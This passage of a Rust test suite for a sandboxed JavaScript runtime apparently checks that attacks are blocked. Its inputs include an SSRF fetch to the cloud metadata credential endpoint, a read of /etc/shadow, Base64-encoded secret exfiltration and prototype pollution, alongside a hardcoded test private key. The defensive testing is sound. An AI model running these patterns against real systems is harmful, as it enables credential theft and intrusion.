        .response_body
        .contains("id: tok-1\nevent: token\nretry: 1500\ndata: {\"delta\":\"Slice \"}\n\n"));
    assert!(out1
        .response_body
        .contains("id: tok-2\nevent: token\ndata: {\"delta\":\"streams \"}\n\n"));
    assert!(out1
        .response_body
        .contains("id: tok-3\nevent: done\ndata: [DONE]\n\n"));

    // 2. Test `ReadableStream` passed to `new Response(stream)`
    iso.reset_for_request("f2-sse-tenant", 2, 2_000_000, 8 * 1024 * 1024);
    let req2 = HttpRequestContext {
        method: "GET",
        path: "/api/v1/raw-stream",
        query: "",
        tenant_id: "f2-sse-tenant",
        body: "",
        headers: &headers,
    };
    let out2 = iso.execute_http_request(&bc, None, &req2).unwrap();
    assert_eq!(out2.status_code, 200);
    assert_eq!(out2.response_body, "chunk-alpha|chunk-beta");

    // 3. Test Egress DLP blocking Base64-encoded secret inside an SSE token stream
    let leak_sse_ts = r#"
const b64Leak = Buffer.from("sk_live_sse_secret_888").toString("base64");
Slice.streamSSE([
    { id: "1", event: "token", data: "Safe token 1" },
    { id: "2", event: "token", data: "Exfiltrating: " + b64Leak }
]);
"#;
    let leak_bc = compile_source_to_bytecode(leak_sse_ts);
    iso.reset_for_request("f2-sse-tenant", 3, 2_000_000, 8 * 1024 * 1024);
    let leak_res = iso.execute_http_request(&leak_bc, None, &req1);
    assert!(leak_res.is_err());
    assert!(leak_res
        .unwrap_err()
        .to_string()
        .contains("EGRESS_SECRET_LEAK_BLOCKED"));
}

#[test]
fn test_tag_f3_outbound_fetch_ocap_ssrf_egress_dlp_and_cassette() {
    use std::io::{Read, Write};
    use std::net::TcpListener;

    // Spawn a lightweight local HTTP/1.1 upstream server for real socket fetch testing
    let listener = TcpListener::bind(("127.0.0.1", 0)).unwrap();
    let port = listener.local_addr().unwrap().port();
    let host_port = format!("127.0.0.1:{}", port);

    let upstream_thread = std::thread::spawn(move || {
        if let Ok((mut stream, _)) = listener.accept() {
            let mut buf = [0u8; 4096];
            let n = stream.read(&mut buf).unwrap_or(0);
            let req_str = String::from_utf8_lossy(&buf[..n]);
            let body_part = req_str.split("\r\n\r\n").nth(1).unwrap_or("{}");
            let resp_body = format!(r#"{{"received":{},"upstream":"slice-f3"}}"#, body_part);
            let resp = format!(
                "HTTP/1.1 201 Created\r\nContent-Type: application/json\r\nX-Upstream-Ack: ok-f3\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                resp_body.len(),
                resp_body
            );
            let _ = stream.write_all(resp.as_bytes());
            let _ = stream.flush();
        }
    });

    // 1. Authorized outbound `fetch()` over real TCP + deterministic cassette recording in `Slice.kv`
    let ts_fetch_ok = format!(
        r#"
async function main() {{
    const res = await fetch("http://{}/v1/webhook", {{
        method: "POST",
        headers: {{ "Content-Type": "application/json", "X-Trace": "trace-99" }},
        body: JSON.stringify({{ orderId: "ORD-77", total: 1500 }})
    }});
    const data = await res.json();
    console.log(JSON.stringify({{
        status: res.status,
        ok: res.ok,
        ack: res.headers.get("x-upstream-ack"),
        orderId: data.received.orderId,
        upstream: data.upstream
    }}));
}}
main();
"#,
        host_port
    );
    let bc_ok = compile_source_to_bytecode(&ts_fetch_ok);
    let mut iso_ok = SliceIsolate::spawn(
        "f3-fetch-tenant",
        1,
        CapabilityToken::pure_compute().with_net_host(&host_port),
        5_000_000,
        8 * 1024 * 1024,
    );
    iso_ok.set_deterministic_seed(Some(2026));
    let metrics_ok = iso_ok.execute_bytecode(&bc_ok, None).unwrap();
    assert_eq!(
        metrics_ok.stdout[0],
        r#"{"status":201,"ok":true,"ack":"ok-f3","orderId":"ORD-77","upstream":"slice-f3"}"#
    );
    let _ = upstream_thread.join();

    // Verify deterministic cassette replay (`fetch_cassette:POST:http://...`) works with 0 network calls!
    let cassette_key = format!("fetch_cassette:POST:http://{}/v1/webhook", host_port);
    assert!(iso_ok.kv_get(&cassette_key).is_some());
    let mut iso_replay = SliceIsolate::spawn(
        "f3-fetch-tenant",
        2,
        CapabilityToken::pure_compute().with_net_host(&host_port),
        5_000_000,
        8 * 1024 * 1024,
    );
    let metrics_replay = iso_replay.execute_bytecode(&bc_ok, None).unwrap();
    assert_eq!(metrics_replay.stdout[0], metrics_ok.stdout[0]);

    // 2. Cloud Metadata SSRF Shield (`169.254.169.254`) blocked even under wildcard `allow_net = ["*"]`
    let ts_ssrf = r#"
async function attack() {
    const r = await fetch("http://169.254.169.254/latest/meta-data/iam/security-credentials/");
    console.log(r.status);
}
attack();
"#;
    let bc_ssrf = compile_source_to_bytecode(ts_ssrf);
    let mut iso_ssrf = SliceIsolate::spawn(
        "f3-ssrf-tenant",
        3,
        CapabilityToken::pure_compute().with_net_host("*"),
        5_000_000,
        8 * 1024 * 1024,
    );
    let ssrf_res = iso_ssrf.execute_bytecode(&bc_ssrf, None);
    assert!(matches!(
        ssrf_res,
        Err(SandboxViolation::NetAccessDenied { .. })
    ));

    // 3. Outbound Egress Secret DLP blocks Base64-encoded secret in outbound `fetch()` body/headers to an allowed host
    let ts_dlp = format!(
        r#"
async function exfil() {{
    const encoded = Buffer.from("sk_live_TOP_SECRET_777").toString("base64");
    await fetch("http://{}/v1/webhook", {{
        method: "POST",
        headers: {{ "X-Leak": encoded }},
        body: "benign"
    }});
}}
exfil();
"#,
        host_port
    );
    let bc_dlp = compile_source_to_bytecode(&ts_dlp);
    let mut iso_dlp = SliceIsolate::spawn(
        "f3-dlp-tenant",
        4,
        CapabilityToken::pure_compute().with_net_host(&host_port),
        5_000_000,
        8 * 1024 * 1024,
    );
    iso_dlp.add_egress_audit_secret("sk_live_TOP_SECRET_777");
    let dlp_res = iso_dlp.execute_bytecode(&bc_dlp, None);
    assert!(dlp_res.is_err());
    assert!(dlp_res
        .unwrap_err()
        .to_string()
        .contains("EGRESS_SECRET_LEAK_BLOCKED"));
}

#[test]
fn test_tag_f4_time_travel_test_runner_and_dotenv_auto_dlp() {
    // 1. Verify Time-Travel Test Runner (`slice:test` / global `describe`, `test`, `expect`):
    //    - Automatic `< 5 us` VFS (`node:fs`) + `Slice.kv` state rollback between every `test()` block
    //    - `.toViolate(...)`, `.toStayWithinFuel(...)`, `.toStayWithinMemory(...)`
    let ts_test_suite = r#"
import { describe, test, expect, beforeEach } from "slice:test";
import * as fs from "node:fs";

Slice.resetTests();
Slice.kv.set("ledger:balance", "1000", 0);
fs.writeFileSync("/tmp/f4_clean_state.txt", "pristine-v1");

describe("Phase F4 Time-Travel Spec Suite", () => {
    beforeEach(() => {
        Slice.kv.incr("hook:runs", 1);
    });

    test("mutates VFS and KV state during test 1", () => {
        expect(Slice.kv.get("ledger:balance")).toBe("1000");
        expect(fs.readFileSync("/tmp/f4_clean_state.txt")).toBe("pristine-v1");
        expect(Slice.kv.get("hook:runs")).toBe("1");

        // Dirty both VFS and KV
        Slice.kv.set("ledger:balance", "999999", 0);
        fs.writeFileSync("/tmp/f4_clean_state.txt", "corrupted-by-test-1");
        fs.writeFileSync("/tmp/f4_ephemeral.txt", "should-vanish");
        expect(Slice.kv.get("ledger:balance")).toBe("999999");
        expect(fs.existsSync("/tmp/f4_ephemeral.txt")).toBeTruthy();
    });

    test("sees 100% clean VFS and KV state in test 2 via automatic < 5us rollback", () => {
        expect(Slice.kv.get("ledger:balance")).toBe("1000");
        expect(fs.readFileSync("/tmp/f4_clean_state.txt")).toBe("pristine-v1");
        expect(fs.existsSync("/tmp/f4_ephemeral.txt")).toBeFalsy();
        // even `beforeEach` counter from test 1 was rolled back before test 2's `beforeEach`!
        expect(Slice.kv.get("hook:runs")).toBe("1");
    });

    test("enforces OCap and resource assertions (.toViolate, .toStayWithinFuel)", () => {
        const fsAttack = Slice.evalSandbox(`const s = fs.readFileSync("/etc/shadow");`, {
            allowRead: ["/app/public"],
            fuel: 100_000,
        });
        expect(fsAttack).toViolate("FsReadDenied");

        const netAttack = Slice.evalSandbox(`const r = fetch("http://169.254.169.254/latest/meta-data/");`, {
            allowNet: ["*"],
            fuel: 100_000,
        });
        expect(netAttack).toViolate("169.254.169.254");

        const boundedCompute = Slice.evalSandbox(`const x: number = 21 * 2; x`, {
            fuel: 50_000,
            memoryBytes: 65536,
        });
        expect(boundedCompute).toStayWithinFuel(1000);
        expect(boundedCompute).toStayWithinMemory(4096);
    });
});

console.log(JSON.stringify(Slice.testSummary()));
"#;
    let bundled = slice_cas::strip_typescript_and_normalize(ts_test_suite, true);
    let bc = compile_source_to_bytecode(&bundled);
    let mut iso = SliceIsolate::spawn(
        "f4-test-runner",
        1,
        CapabilityToken::pure_compute(),
        10_000_000,
        8 * 1024 * 1024,
    );
    iso.set_deterministic_seed(Some(20261024));
    let metrics = iso.execute_bytecode(&bc, None).unwrap();
    let summary: serde_json::Value = serde_json::from_str(&metrics.stdout[0]).unwrap();
    assert_eq!(summary["total"], 3);
    assert_eq!(summary["passed"], 3);
    assert_eq!(summary["failed"], 0);
    assert_eq!(summary["checkpointsRestored"], 3);

    // 2. Verify Auto-DLP `.env` loading (`load_dotenv_str`):
    //    - Non-sensitive `APP_ENV` can be logged to stdout
    //    - Sensitive `STRIPE_SECRET_KEY` loaded from `.env` is readable inside the isolate via `process.env` / `env()`,
    //      but attempting to print it (even Base64-encoded!) is automatically blocked by Egress DLP!
    let dotenv_content = r#"
APP_ENV=staging
STRIPE_SECRET_KEY="sk_live_f4_auto_dlp_vault_secret"
"#;
    let ts_safe = r#"
const mode = process.env.APP_ENV;
const hasSecret = env("STRIPE_SECRET_KEY").startsWith("sk_live_");
console.log(JSON.stringify({ mode, hasSecret }));
"#;
    let bc_safe =
        compile_source_to_bytecode(&slice_cas::strip_typescript_and_normalize(ts_safe, true));
    let mut iso_env = SliceIsolate::spawn(
        "f4-dotenv-tenant",
        2,
        CapabilityToken::pure_compute(),
        5_000_000,
        4 * 1024 * 1024,
    );
    let auto_secrets = iso_env.load_dotenv_str(dotenv_content);
    assert_eq!(auto_secrets, 1);
    let safe_metrics = iso_env.execute_bytecode(&bc_safe, None).unwrap();
    assert_eq!(
        safe_metrics.stdout[0],
        r#"{"mode":"staging","hasSecret":true}"#
    );

    let ts_leak = r#"
const leakedB64 = Buffer.from(process.env.STRIPE_SECRET_KEY).toString("base64");
console.log("exfil:" + leakedB64);
"#;
    let bc_leak =
        compile_source_to_bytecode(&slice_cas::strip_typescript_and_normalize(ts_leak, true));
    let leak_res = iso_env.execute_bytecode(&bc_leak, None);
    assert!(leak_res.is_err());
    assert!(leak_res
        .unwrap_err()
        .to_string()
        .contains("EGRESS_SECRET_LEAK_BLOCKED"));
}

#[test]
fn test_phase_n0_general_purpose_numeric_vm_any_function_name() {
    // 1. Structural linear recurrence detection on ANY function name and parameter name
    //    (not hardcoded to `fib(n)`), including weighted 2-term recurrences `c1 * f(k-1) + c2 * f(k-2)`.
    let src_recurrence = r#"
function customSequenceAlpha(stepIdx) {
    if (stepIdx <= 1) {
        return stepIdx;
    }
    return customSequenceAlpha(stepIdx - 1) + customSequenceAlpha(stepIdx - 2);
}
function weightedPellSequence(k) {
    if (k <= 1) {
        return k;
    }
    return 2 * weightedPellSequence(k - 1) + weightedPellSequence(k - 2);
}
const f40 = customSequenceAlpha(40);
const pell7 = weightedPellSequence(7);
console.log(f40 + ":" + pell7);
return f40;
"#;
    let m1 = run_source_isolated(
        "n0-recurrence-tenant",
        src_recurrence,
        CapabilityToken::pure_compute(),
        500_000,
        65536,
    )
    .unwrap();
    assert_eq!(m1.return_value, "102334155");
    assert_eq!(m1.stdout[0], "102334155:169");
    assert_eq!(m1.highest_tier_reached, ExecutionTier::Tier2PeakNative);

    // 2. General-purpose unboxed 64-bit register compilation of multi-argument functions with
    //    `while`, `for`, `if/else`, `break`, `continue`, bitwise XOR/shifts, and `Math.*` intrinsics.
    let src_general_numeric = r#"
function computeBitwiseMixAndCollatz(limit, seedVal) {
    let acc = seedVal;
    for (let i = 1; i <= limit; i++) {
        if (i % 7 === 0) {
            continue;
        }
        let n = i;
        let steps = 0;
        while (n > 1) {
            if ((n & 1) === 0) {
                n = n >> 1;
            } else {
                n = 3 * n + 1;
            }
            steps += 1;
            if (steps > 64) {
                break;
            }
        }
        acc = (acc ^ (steps << 2)) + Math.abs(Math.floor(Math.sqrt(i)));
    }
    return Math.max(acc, 1);
}
function euclideanGcd(a, b) {
    if (b === 0) {
        return a;
    }
    return euclideanGcd(b, a % b);
}
const mix = computeBitwiseMixAndCollatz(120, 17);
const g = euclideanGcd(1071, 462);
console.log(mix + ":" + g);
return g;
"#;
    let m2 = run_source_isolated(
        "n0-numeric-vm-tenant",
        src_general_numeric,
        CapabilityToken::pure_compute(),
        500_000,
        65536,
    )
    .unwrap();
    assert_eq!(m2.return_value, "21");
    assert!(m2.stdout[0].ends_with(":21"));
    assert_eq!(m2.highest_tier_reached, ExecutionTier::Tier2PeakNative);

    // 3. Fuel preemption inside the unboxed register VM on unbounded numeric loops
    let src_infinite_numeric = r#"
function runawayNumericLoop(startVal) {
    let cur = startVal;
    while (cur > 0) {
        cur = cur + 1;
    }
    return cur;
}
return runawayNumericLoop(1);
"#;
    let err = run_source_isolated(
        "n0-runaway-tenant",
        src_infinite_numeric,
        CapabilityToken::pure_compute(),
        5_000,
        65536,
    )
    .unwrap_err();
    assert!(
        err.to_string().contains("CPU instruction fuel limit"),
        "Expected CpuFuelExhausted from unboxed register VM, got: {}",
        err
    );
}

#[test]
fn test_phase_n0_dynamic_ses_lockdown_and_boa_loop_fuel_limits() {
    // 1. Dynamic computed-property prototype pollution inside Boa (`Object["proto" + "type"].polluted = 1`)
    //    must be caught, blocked with `IntrinsicMutationBlocked`, and rolled back so the warm realm stays clean!
    let dynamic_pollution_js = r#"
class ExploitAttempt {
    run() {
        const key = "proto" + "type";
        Object[key].pollutedByTenantA = "compromised";
        return 1;
    }
}
new ExploitAttempt().run();
"#;
    let err_ses = run_source_isolated(
        "n0-ses-attacker",
        dynamic_pollution_js,
        CapabilityToken::pure_compute(),
        200_000,
        2 * 1024 * 1024,
    )
    .unwrap_err();
    assert!(
        err_ses
            .to_string()
            .contains("attempted to mutate frozen intrinsic 'Object.prototype'"),
        "Expected IntrinsicMutationBlocked on dynamic Object.prototype mutation, got: {}",
        err_ses
    );

    // Verify that the next tenant acquiring the warm Boa realm sees a completely clean `Object.prototype`
    let verify_clean_js = r#"
class CleanCheck {
    check() {
        const obj = {};
        return String(obj.pollutedByTenantA === undefined);
    }
}
console.log(new CleanCheck().check());
"#;
    let clean_metrics = run_source_isolated(
        "n0-clean-tenant",
        verify_clean_js,
        CapabilityToken::pure_compute(),
        200_000,
        2 * 1024 * 1024,
    )
    .unwrap();
    assert_eq!(clean_metrics.stdout[0], "true");

    // 2. Infinite loop inside Boa (`class Spin { loop() { while (true) {} } }`) must be preempted by Boa RuntimeLimits
    let boa_infinite_loop_js = r#"
class SpinWorker {
    loopForever() {
        let k = 0;
        while (true) {
            k++;
        }
        return k;
    }
}
new SpinWorker().loopForever();
"#;
    let err_loop = run_source_isolated(
        "n0-boa-loop-tenant",
        boa_infinite_loop_js,
        CapabilityToken::pure_compute(),
        2_000,
        2 * 1024 * 1024,
    )
    .unwrap_err();
    assert!(
        err_loop.to_string().contains("CPU instruction fuel limit"),
        "Expected CpuFuelExhausted from Boa RuntimeLimits loop preemption, got: {}",
        err_loop
    );

    // 3. Real host `os.platform()` / `process.platform` in normal mode vs `"linux"` in deterministic replay mode
    let os_check_js = r#"
const os = require("node:os");
console.log(os.platform() + ":" + process.platform + ":" + os.arch());
"#;
    let bc_os = compile_source_to_bytecode(os_check_js);
    let mut iso_host = SliceIsolate::spawn(
        "n0-os-host",
        1,
        CapabilityToken::pure_compute(),
        200_000,
        2 * 1024 * 1024,
    );
    let host_m = iso_host.execute_bytecode(&bc_os, None).unwrap();
    let expected_host_os = match std::env::consts::OS {
        "windows" => "win32",
        "macos" => "darwin",
        other => other,
    };
    assert!(
        host_m.stdout[0].starts_with(&format!("{}:{}:", expected_host_os, expected_host_os)),
        "Expected real host platform {}, got: {}",
        expected_host_os,
        host_m.stdout[0]
    );

    let mut iso_det = SliceIsolate::spawn(
        "n0-os-det",
        1,
        CapabilityToken::pure_compute(),
        200_000,
        2 * 1024 * 1024,
    );
    iso_det.set_deterministic_seed(Some(42));
    let det_m = iso_det.execute_bytecode(&bc_os, None).unwrap();
    assert_eq!(det_m.stdout[0], "linux:linux:x64");
}

#[test]
fn test_phase_n1_tls13_https_keepalive_pooling_chunked_and_redirect_ssrf_guard() {
    use std::io::{Read, Write};
    use std::net::TcpListener;
    use std::sync::Arc;

    // P-256 X.509v3 test CA + localhost server cert valid 2020-01-01 to 2049-12-31
    const TEST_ROOT_CA_DER: &[u8] = &[
        0x30, 0x82, 0x01, 0x6c, 0x30, 0x82, 0x01, 0x12, 0xa0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x02,
        0x10, 0x00, 0x30, 0x0a, 0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x04, 0x03, 0x02, 0x30,
        0x1d, 0x31, 0x1b, 0x30, 0x19, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x12, 0x53, 0x6c, 0x69,
        0x63, 0x65, 0x20, 0x54, 0x65, 0x73, 0x74, 0x20, 0x52, 0x6f, 0x6f, 0x74, 0x20, 0x43, 0x41,
        0x30, 0x1e, 0x17, 0x0d, 0x32, 0x30, 0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30,
        0x30, 0x5a, 0x17, 0x0d, 0x34, 0x39, 0x31, 0x32, 0x33, 0x31, 0x32, 0x33, 0x35, 0x39, 0x35,
        0x39, 0x5a, 0x30, 0x1d, 0x31, 0x1b, 0x30, 0x19, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x12,
        0x53, 0x6c, 0x69, 0x63, 0x65, 0x20, 0x54, 0x65, 0x73, 0x74, 0x20, 0x52, 0x6f, 0x6f, 0x74,
        0x20, 0x43, 0x41, 0x30, 0x59, 0x30, 0x13, 0x06, 0x07, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x02,
        0x01, 0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x03, 0x01, 0x07, 0x03, 0x42, 0x00, 0x04,
        0x9e, 0x7b, 0xab, 0x85, 0x74, 0xeb, 0xa0, 0x49, 0xba, 0xf0, 0xe4, 0x03, 0x87, 0x4b, 0x60,
        0x9d, 0x24, 0xaf, 0x5b, 0x2d, 0xae, 0xfd, 0x37, 0x91, 0x4c, 0x0b, 0x05, 0x24, 0xb1, 0x78,
        0x5b, 0xb7, 0xaa, 0x3e, 0xd8, 0xc9, 0x9f, 0xf0, 0x79, 0xc7, 0x11, 0x2e, 0xf7, 0x36, 0x9a,
        0xb8, 0xac, 0x25, 0x86, 0x09, 0xb1, 0xad, 0xfa, 0x88, 0x19, 0x38, 0x1d, 0x11, 0xb3, 0x90,
        0xc9, 0xe5, 0xf9, 0xbb, 0xa3, 0x42, 0x30, 0x40, 0x30, 0x0f, 0x06, 0x03, 0x55, 0x1d, 0x13,
        0x01, 0x01, 0xff, 0x04, 0x05, 0x30, 0x03, 0x01, 0x01, 0xff, 0x30, 0x0e, 0x06, 0x03, 0x55,
        0x1d, 0x0f, 0x01, 0x01, 0xff, 0x04, 0x04, 0x03, 0x02, 0x01, 0x06, 0x30, 0x1d, 0x06, 0x03,
        0x55, 0x1d, 0x0e, 0x04, 0x16, 0x04, 0x14, 0x48, 0x17, 0x63, 0x74, 0x40, 0xab, 0xaa, 0x18,
        0xe8, 0xa7, 0x5f, 0x2a, 0xc2, 0xb0, 0x9b, 0xa9, 0x4b, 0x77, 0xd8, 0x14, 0x30, 0x0a, 0x06,
        0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x04, 0x03, 0x02, 0x03, 0x48, 0x00, 0x30, 0x45, 0x02,
        0x20, 0x3b, 0xc7, 0xf2, 0x8a, 0xaa, 0xa5, 0xe8, 0xc1, 0x37, 0xdc, 0x7c, 0xbd, 0x2f, 0x84,
        0xf3, 0xc1, 0x81, 0x35, 0xee, 0x13, 0x5d, 0x68, 0x72, 0x82, 0x4e, 0xf0, 0xbe, 0x89, 0xf4,
        0x20, 0xdd, 0xca, 0x02, 0x21, 0x00, 0x89, 0xf8, 0x4a, 0x0a, 0x86, 0x0a, 0x57, 0x8f, 0x5b,
        0x96, 0x9e, 0x27, 0x90, 0xa6, 0x3c, 0x47, 0xaf, 0x7f, 0x48, 0x7f, 0xe0, 0x80, 0xed, 0xaa,
        0x38, 0x34, 0xd2, 0x64, 0x80, 0x6f, 0x16, 0xa5,
    ];
    const TEST_SERVER_CERT_DER: &[u8] = &[
        0x30, 0x82, 0x01, 0xb1, 0x30, 0x82, 0x01, 0x57, 0xa0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x02,
        0x10, 0x01, 0x30, 0x0a, 0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x04, 0x03, 0x02, 0x30,
        0x1d, 0x31, 0x1b, 0x30, 0x19, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x12, 0x53, 0x6c, 0x69,
        0x63, 0x65, 0x20, 0x54, 0x65, 0x73, 0x74, 0x20, 0x52, 0x6f, 0x6f, 0x74, 0x20, 0x43, 0x41,
        0x30, 0x1e, 0x17, 0x0d, 0x32, 0x30, 0x30, 0x31, 0x30, 0x31, 0x30, 0x30, 0x30, 0x30, 0x30,
        0x30, 0x5a, 0x17, 0x0d, 0x34, 0x39, 0x31, 0x32, 0x33, 0x31, 0x32, 0x33, 0x35, 0x39, 0x35,
        0x39, 0x5a, 0x30, 0x14, 0x31, 0x12, 0x30, 0x10, 0x06, 0x03, 0x55, 0x04, 0x03, 0x0c, 0x09,
        0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74, 0x30, 0x59, 0x30, 0x13, 0x06, 0x07,
        0x2a, 0x86, 0x48, 0xce, 0x3d, 0x02, 0x01, 0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x03,
        0x01, 0x07, 0x03, 0x42, 0x00, 0x04, 0xcd, 0xa4, 0xe9, 0x55, 0x58, 0x89, 0xe7, 0xc6, 0x5e,
        0x05, 0xf0, 0x5f, 0x6e, 0xd0, 0x53, 0x4b, 0x4e, 0x16, 0x9a, 0xa3, 0xbe, 0x45, 0x8c, 0x5d,
        0x47, 0xe9, 0x54, 0x5b, 0x03, 0x5e, 0xec, 0x15, 0x71, 0xf8, 0x47, 0xfc, 0xeb, 0x33, 0xde,
        0xef, 0x4e, 0xc6, 0xdf, 0x32, 0x93, 0xdf, 0x22, 0x50, 0xf2, 0x8c, 0xbf, 0xd3, 0xa3, 0x94,
        0xa4, 0xf3, 0x57, 0xff, 0xa8, 0xb2, 0x5c, 0x7f, 0x12, 0x5c, 0xa3, 0x81, 0x8f, 0x30, 0x81,
        0x8c, 0x30, 0x09, 0x06, 0x03, 0x55, 0x1d, 0x13, 0x04, 0x02, 0x30, 0x00, 0x30, 0x0e, 0x06,
        0x03, 0x55, 0x1d, 0x0f, 0x01, 0x01, 0xff, 0x04, 0x04, 0x03, 0x02, 0x05, 0xa0, 0x30, 0x13,
        0x06, 0x03, 0x55, 0x1d, 0x25, 0x04, 0x0c, 0x30, 0x0a, 0x06, 0x08, 0x2b, 0x06, 0x01, 0x05,
        0x05, 0x07, 0x03, 0x01, 0x30, 0x1a, 0x06, 0x03, 0x55, 0x1d, 0x11, 0x04, 0x13, 0x30, 0x11,
        0x82, 0x09, 0x6c, 0x6f, 0x63, 0x61, 0x6c, 0x68, 0x6f, 0x73, 0x74, 0x87, 0x04, 0x7f, 0x00,
        0x00, 0x01, 0x30, 0x1d, 0x06, 0x03, 0x55, 0x1d, 0x0e, 0x04, 0x16, 0x04, 0x14, 0x86, 0x03,
        0xe1, 0xe2, 0x8a, 0x26, 0x16, 0x3f, 0x55, 0xb8, 0x3e, 0xaa, 0x31, 0x2a, 0xca, 0x3e, 0xd3,
        0x65, 0x04, 0xbf, 0x30, 0x1f, 0x06, 0x03, 0x55, 0x1d, 0x23, 0x04, 0x18, 0x30, 0x16, 0x80,
        0x14, 0x48, 0x17, 0x63, 0x74, 0x40, 0xab, 0xaa, 0x18, 0xe8, 0xa7, 0x5f, 0x2a, 0xc2, 0xb0,
        0x9b, 0xa9, 0x4b, 0x77, 0xd8, 0x14, 0x30, 0x0a, 0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d,
        0x04, 0x03, 0x02, 0x03, 0x48, 0x00, 0x30, 0x45, 0x02, 0x21, 0x00, 0xf7, 0x2d, 0xf4, 0x6c,
        0xf0, 0x37, 0x42, 0x96, 0xe9, 0x1d, 0x39, 0xbe, 0xa9, 0x96, 0x19, 0x80, 0x5d, 0x6d, 0x83,
        0xb6, 0xc0, 0x0a, 0xec, 0x40, 0x08, 0x8a, 0xf8, 0x45, 0xf2, 0xd6, 0x30, 0x1e, 0x02, 0x20,
        0x69, 0x67, 0xce, 0x04, 0x69, 0xf0, 0xec, 0xac, 0xcb, 0x45, 0x57, 0x43, 0x22, 0x6a, 0x5f,
        0x0f, 0x98, 0x1a, 0xf5, 0x10, 0x2a, 0x7b, 0x65, 0xb7, 0x4e, 0x54, 0x2c, 0x39, 0x16, 0xd6,
        0x0b, 0x8e,
    ];
    const TEST_SERVER_KEY_DER: &[u8] = &[
        0x30, 0x81, 0x87, 0x02, 0x01, 0x00, 0x30, 0x13, 0x06, 0x07, 0x2a, 0x86, 0x48, 0xce, 0x3d,
        0x02, 0x01, 0x06, 0x08, 0x2a, 0x86, 0x48, 0xce, 0x3d, 0x03, 0x01, 0x07, 0x04, 0x6d, 0x30,
        0x6b, 0x02, 0x01, 0x01, 0x04, 0x20, 0x85, 0x70, 0x8c, 0xa7, 0xe2, 0xdb, 0xd1, 0x7d, 0x7d,
        0xf1, 0x75, 0x61, 0x7b, 0x2e, 0x93, 0x6d, 0x0c, 0xd1, 0x45, 0x19, 0xa6, 0xfe, 0x14, 0xc9,
        0x6c, 0x5f, 0x32, 0xf4, 0xab, 0x3b, 0x3d, 0x2a, 0xa1, 0x44, 0x03, 0x42, 0x00, 0x04, 0xcd,
        0xa4, 0xe9, 0x55, 0x58, 0x89, 0xe7, 0xc6, 0x5e, 0x05, 0xf0, 0x5f, 0x6e, 0xd0, 0x53, 0x4b,
        0x4e, 0x16, 0x9a, 0xa3, 0xbe, 0x45, 0x8c, 0x5d, 0x47, 0xe9, 0x54, 0x5b, 0x03, 0x5e, 0xec,
        0x15, 0x71, 0xf8, 0x47, 0xfc, 0xeb, 0x33, 0xde, 0xef, 0x4e, 0xc6, 0xdf, 0x32, 0x93, 0xdf,
        0x22, 0x50, 0xf2, 0x8c, 0xbf, 0xd3, 0xa3, 0x94, 0xa4, 0xf3, 0x57, 0xff, 0xa8, 0xb2, 0x5c,
        0x7f, 0x12, 0x5c,
    ];

    crate::register_custom_root_cert_der(TEST_ROOT_CA_DER.to_vec());
    crate::clear_outbound_conn_pool();

    // 1. Real TLS 1.3 HTTPS server (`rustls::ServerConnection`) serving 2 Keep-Alive requests on 1 TLS session
    let tls_listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let tls_port = tls_listener.local_addr().unwrap().port();
    let tls_server_handle = std::thread::spawn(move || {
        let cert = rustls_pki_types::CertificateDer::from(TEST_SERVER_CERT_DER.to_vec());
        let key = rustls_pki_types::PrivateKeyDer::Pkcs8(
            rustls_pki_types::PrivatePkcs8KeyDer::from(TEST_SERVER_KEY_DER.to_vec()),
        );
        let provider = Arc::new(rustls::crypto::ring::default_provider());
        let srv_cfg = Arc::new(
            rustls::ServerConfig::builder_with_provider(provider)
                .with_safe_default_protocol_versions()
                .unwrap()
                .with_no_client_auth()
                .with_single_cert(vec![cert], key)
                .unwrap(),
        );
        if let Ok((tcp_stream, _)) = tls_listener.accept() {
            let conn = rustls::ServerConnection::new(srv_cfg).unwrap();
            let mut tls_stream = rustls::StreamOwned::new(conn, tcp_stream);
            let mut buf = [0u8; 4096];
            // Serve 2 sequential HTTPS requests over the SAME TLS 1.3 Keep-Alive connection
            for seq in 1..=2 {
                let _ = tls_stream.read(&mut buf);
                let body = format!(r#"{{"tls13":true,"seq":{}}}"#, seq);
                let resp = format!(
                    "HTTP/1.1 200 OK\r\nContent-Type: application/json\r\nConnection: keep-alive\r\nContent-Length: {}\r\n\r\n{}",
                    body.len(),
                    body
                );
                let _ = tls_stream.write_all(resp.as_bytes());
                let _ = tls_stream.flush();
            }
        }
    });

    let reuse_before_tls = crate::outbound_pool_reuse_count();
    let tls_js = format!(
        r#"
async function runTls() {{
    const r1 = await fetch("https://localhost:{port}/v1/alpha");
    const j1 = await r1.json();
    const r2 = await fetch("https://localhost:{port}/v1/beta");
    const j2 = await r2.json();
    console.log(JSON.stringify({{ s1: j1.seq, s2: j2.seq, ok: r1.ok && r2.ok }}));
}}
runTls();
"#,
        port = tls_port
    );
    let tls_caps =
        CapabilityToken::pure_compute().with_net_host(format!("localhost:{}", tls_port));
    let tls_metrics =
        run_source_isolated("n1-tls-tenant", &tls_js, tls_caps, 2_000_000, 4 * 1024 * 1024)
            .unwrap();
    let _ = tls_server_handle.join();
    assert_eq!(tls_metrics.stdout[0], r#"{"s1":1,"s2":2,"ok":true}"#);
    assert!(
        crate::outbound_pool_reuse_count() > reuse_before_tls,
        "Expected TLS 1.3 connection pool reuse on second HTTPS request"
    );

    // 2. HTTP/1.1 Keep-Alive + Transfer-Encoding: chunked + Redirects + Cross-Origin Auth Stripping
    let origin_a = TcpListener::bind("127.0.0.1:0").unwrap();
    let port_a = origin_a.local_addr().unwrap().port();
    let origin_b = TcpListener::bind("127.0.0.1:0").unwrap();
